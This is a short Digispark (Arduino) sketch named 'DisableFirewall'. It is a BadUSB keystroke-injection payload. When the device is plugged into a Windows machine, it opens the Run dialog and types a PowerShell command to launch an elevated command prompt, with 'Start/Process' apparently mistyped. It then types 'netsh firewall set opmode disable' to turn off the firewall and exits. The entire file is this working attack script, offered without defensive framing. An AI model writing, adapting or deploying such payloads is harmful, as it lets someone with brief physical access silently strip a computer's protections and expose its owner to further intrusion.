//DisableFirewall
#include <DigiKeyboard.h>
void setup() {
df();
}
void loop() {
}
void df() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay (1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay (500);
  DigiKeyboard.print ("powershell Start/Process cmd /Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay (12000);
  //DigiKeyboard.sendKeyStroke(KEY_S, MOD_ALT_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("netsh firewall set opmode disable");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
